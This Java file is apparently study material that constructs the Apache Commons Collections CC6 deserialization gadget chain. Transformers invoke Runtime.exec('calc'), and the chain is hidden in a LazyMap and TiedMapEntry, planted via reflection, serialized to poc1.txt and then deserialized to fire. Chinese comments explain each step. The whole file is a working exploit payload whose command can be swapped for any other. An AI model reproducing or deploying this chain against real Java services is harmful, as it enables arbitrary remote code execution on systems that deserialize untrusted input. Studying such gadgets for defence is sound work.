package CommonsCollection.Clown_CC6;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class POC1 {
    public static void Serialization(Object object) throws Exception{
        FileOutputStream fileOutputStream = new FileOutputStream("poc1.txt");
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(object);
        System.out.println("output serialization");
    }
    public static void Unserialization() throws Exception{
        FileInputStream fileInputStream = new FileInputStream("poc1.txt");
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        objectInputStream.readObject();
        System.out.println("input unserialization");
    }

    public static void main(String[] args) throws Exception{
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class, Class[].class},new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class }, new String[] {"calc" }),
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap map = new HashMap();
        Map lazymap = LazyMap.decorate(map,new ConstantTransformer(1));//这里先设置为一个没有用的，下面通过反射设置成目标为了避免在本地本地调试时触发命令执⾏

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,"aaa");

        HashMap<Object, Object> map2 = new HashMap<>();//这里是触发点
        map2.put(tiedMapEntry,"bbb");
        lazymap.remove("aaa");//这里将序列化过程中存入的key删除

        Class clazz = LazyMap.class;//这里通过反射将LazyMap设置为目标值
        Field factoryField = clazz.getDeclaredField("factory");
        factoryField.setAccessible(true);//私有属性
        factoryField.set(lazymap,chainedTransformer);//这里设置为目标的危险函数

        Serialization(map2);
        Unserialization();
    }
}
